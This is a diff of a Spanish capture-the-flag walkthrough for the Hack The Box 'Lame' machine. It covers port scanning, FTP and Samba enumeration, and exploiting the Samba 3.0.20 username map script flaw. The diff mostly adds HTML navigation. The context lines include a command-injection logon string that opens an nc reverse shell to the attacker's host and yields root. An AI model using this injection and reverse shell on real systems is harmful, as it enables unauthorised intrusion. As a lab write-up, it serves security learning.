@@ -27,8 +27,61 @@ tags:
 ![](/assets/images/htb-writeup-lame/lame_logo.png)
 La máquina lame es una de las primeras maquinas que hice, justo después del **Starting Point**, obviamente necesité mucha ayuda porque había cosas que aún no comprendía del todo. Es una maquina super fácil, ya que lo único que haremos será utilizar el servicio Samba para poder obtener acceso a la máquina.
 
-# Recopilación de Información
-## Traza ICMP
+
+<br>
+<hr>
+<div id="Indice">
+	<h1>Índice</h1>
+	<ul>
+		<li><a href="#Recopilacion">Recopilación de Información</a></li>
+			<ul>
+				<li><a href="#Ping">Traza ICMP</a></li>
+				<li><a href="#Puertos">Escaneo de Puertos</a></li>
+				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+			</ul>
+		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#FTP">Enumeración Servicio FTP</a></li>
+				<li><a href="#Exploit">Buscando un Exploit para Servicio FTP</a></li>
+				<ul>
+					<li><a href="#PruebaExp">Probando Exploit: vsftpd 2.3.4 - Backdoor Command Execution</a></li>
+				</ul>
+			</ul>
+		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#Samba">Enumeración Servicio Samba</a></li>
+			</ul>
+		<li><a href="#Post">Post Explotación</a></li>
+			<ul>
+				<li><a href="#Busqueda">Buscando, Analizando y Probando un Exploit para Servicio Samba</a></li>
+				<ul>
+                                        <li><a href="#PruebaExp2">Probando Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)</a></li>
+                                </ul>
+				<li><a href="#Root">Accediendo a la Máquina</a></li>
+			</ul>
+		<li><a href="#Otras">Otras Formas</a></li>
+			<ul>
+				<li><a href="#Metas">Metasploit</a></li>
+				<li><a href="#UsandoMetas">Usando Metasploit</a></li>
+			</ul>
+	</ul>
+</div>
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Ping">Traza ICMP</h2>
+
 Para comenzar, debemos saber si la maquina está conectada o no. Para esto lanzamos una traza ICMP que no es más que enviar paquetes de datos con la finalidad de que lleguen a un destino, si se pierden es que la maquina no está conectada, pero si llegan, entonces podemos empezar.
 ```
 ping -c 4 10.10.10.3                  
@@ -44,7 +97,8 @@ rtt min/avg/max/mdev = 128.329/129.436/131.846/1.404 ms
 ```
 Lanzamos 4 paquetes, entonces podemos iniciar la penetración.
 
-## Escaneo de Puertos
+<h2 id="Puertos">Escaneo de Puertos</h2>
+
 Vamos a realizar un escaneo de los puertos que tenga abiertos la máquina, este escaneo lo guardaremos en un fichero grepeable para poder analizarlo mejor. Una vez obtenidos los puertos haremos un escaneo de servicios.
 
 ```
@@ -86,7 +140,8 @@ Nmap done: 1 IP address (1 host up) scanned in 31.56 seconds
 * -Pn: Para indicar que se omita el descubrimiento de hosts.
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-## Escaneo de Servicios
+<h2 id="Servicios">Escaneo de Servicios</h2>
+
 Analizando el escaneo de servicios, observamos que hay 3 servicios que nos interesan. El primero es el servicio FTP ya que podemos loguearnos como anonymous, el servicio ssh aunque de momento no tenemos ningún usuario ni credencial y el servicio Samba aunque lo vemos en 2 puertos, el que nos interesa más será el puerto 445.
 ```
 nmap -sC -sV -p21,22,139,445,3632
@@ -142,8 +197,21 @@ Nmap done at Wed Jan 11 14:11:32 2023 -- 1 IP address (1 host up) scanned in 54.
 * -p: Para indicar puertos específicos.
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-# Análisis de Vulnerabilidades
-## Analizando el Servicio FTP
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="FTP">Enumeración Servicio FTP</h2>
+
 Entraremos a este servicio como usuario anonymous, para ver que podemos encontrar que nos pueda ser util.
 ```
 ftp 10.10.10.3 
@@ -177,7 +245,8 @@ local: /etc/passwd remote: /etc/passwd
 ```
 No se puede, por lo que deducimos que no tenemos permisos de escritura. Aunque quizá hay un exploit que podamos usar aquí.
 
-## Buscando un Exploit para el Servicio FTP
+<h2 id="Exploit">Buscando un Exploit para Servicio FTP</h2>
+
 Recordemos que tenemos la versión del servicio FTP de la máquina víctima, por lo que podemos investigar si hay un exploit que nos sirva para vulnerar dicha máquina.
 
 ```
@@ -191,7 +260,9 @@ vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                          
 Shellcodes: No Results
 Papers: No Results
 ```
-### Probando Exploit: vsftpd 2.3.4 - Backdoor Command Execution
+
+<h3 id="PruebaExp">Probando Exploit: vsftpd 2.3.4 - Backdoor Command Execution</h3>
+
 Encontramos un exploit creado en python, vamos a analizarlo, utiliza el comando `searchsploit -x unix/remote/49757.py` para analizar el exploit:
 
 ```
@@ -222,8 +293,21 @@ tn2.interact()
 
 Lo que hace este exploit es tratar de conectarnos al servicio FTP a través del puerto 6200 (o eso entiendo), pero no creo que funcione porque dicho puerto no está abierto, así que no perdamos tiempo y mejor analicemos el servicio Samba.
 
-# Explotación de Vulnerabilidades
-## Analizando el Servicio Samba
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Samba">Enumeración Servicio Samba</h2>
+
 Ahora nos logueamos en el Samba para ver que hay dentro, lo haremos de una forma sin que tengamos que meter un usuario.
 
 Primero vamos a tratar de mostrar los recursos compartidos que estén a nivel de red, para ver si hay algo útil.
@@ -272,8 +356,21 @@ smb: \>
 ```
 Pues no veo nada útil, bueno que yo sepa ahí no nos sirve algo, así que mejor vamos a buscar un exploit que no ayude aquí.
 
-# Post Explotación
-## Buscando, Analizando y Probando un Exploit para Samba
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Busqueda">Buscando, Analizando y Probando un Exploit para Servicio Samba</h2>
+
 Como mencione anteriormente como no encontramos mucho aquí lo que podemos hacer es buscar un exploit que nos ayude.
 ```
 searchsploit Samba 3.0.20      
@@ -288,7 +385,9 @@ Samba < 3.6.2 (x86) - Denial of Service (PoC)                                   
 Shellcodes: No Results
 Papers: No Results
 ```
-### Probando Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
+
+<h3 id="PruebaExp2">Probando Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)</h3>
+
 Vamos a analizar el exploit que esta hecho en ruby, ósea el **Username Map Script**. El exploit es usado en **Metasploit** de forma automatizada pero analicemos cual es el exploit que usa. Recuerda usar el comando **searchsploit -x** para analizar el exploit.
 
 ```
@@ -358,7 +457,8 @@ connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 32800
 root
 ```
 
-## Accediendo a la Máquina
+<h2 id="Root">Accediendo a la Máquina</h2>
+
 Como ya vimos en las pruebas anteriores, podemos tratar de conectar una terminal bash a la máquina víctima, así que alzaremos una netcat y veremos si podemos activarla.
 ```
 logon "/=`nohup nc -e /bin/bash 10.10.14.8 443`"
@@ -410,11 +510,23 @@ root@lame:/# cat ./root/root.txt
 ```
 Y listo ya quedo esta máquina al estilo OSCP.
 
-# Otras Formas
-# Metasploit
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Otras" style="text-align:center;">Otras Formas</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Metas">Metasploit</h2>
+
 Con esta madre es super sencillo y ps casi no aprendes ni papa pero aun así por si lo quieren probar, así se usa:
 
-## Activando Metaspploit
 Para comenzar a usar Metasploit primero debemos iniciar la base de datos de este:
 ```
 msfdb start                                                                      
@@ -441,7 +553,9 @@ msfconsole
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                                     
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 ```
-## Usando Metasploit
+
+<h2 id="UsandoMetas">Usando Metasploit</h2>
+
 Una vez activado tan simple como lo habíamos hecho antes, buscamos el servicio para ver si hay un exploit y lo usamos:
 ```
 msf6 > search Samba 3.0.20
@@ -538,4 +652,6 @@ msf6 exploit(multi/samba/usermap_script) > exit
 └─# msfdb stop 
 [+] Stopping database
 ```
+
+<br>
 # FIN
